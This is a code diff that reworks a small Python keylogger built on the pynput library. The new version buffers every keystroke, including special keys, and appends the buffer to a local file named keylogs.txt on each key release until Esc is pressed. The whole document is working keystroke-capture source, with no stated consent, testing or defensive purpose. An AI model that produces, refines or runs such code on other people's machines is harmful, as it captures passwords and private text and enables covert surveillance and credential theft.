@@ -1,18 +1,33 @@
-import logging
+import pynput
 from pynput import keyboard
 
-logging.basicConfig(filename="keylogs.txt", level=logging.INFO)
+log = ""
 
 def on_press(key):
+    global log
     try:
-        if key == keyboard.Key.esc:
-            return False
-        elif key.char is not None:
-            logging.info(f'{key.char}')
+        log += str(key.char)
+    except AttributeError:
+        if key == keyboard.Key.space:
+            log += " "
+        elif key == keyboard.Key.enter:
+            log += "\n"
         else:
-            logging.info(f'[{key.name.upper()}]')
-    except Exception as e:
-        logging.error(f'Error: {e}')
+            log += f"[{key.name.upper()}]"
 
-with keyboard.Listener(on_press=on_press) as listener:
+def write_file(log):
+    with open("keylogs.txt", "a") as file:
+        file.write(log)
+
+def on_release(key):
+    global log
+    if key == keyboard.Key.esc:
+        return False
+    write_file(log)
+    log = ""
+
+with open("keylogs.txt", "w"):
+    pass
+
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
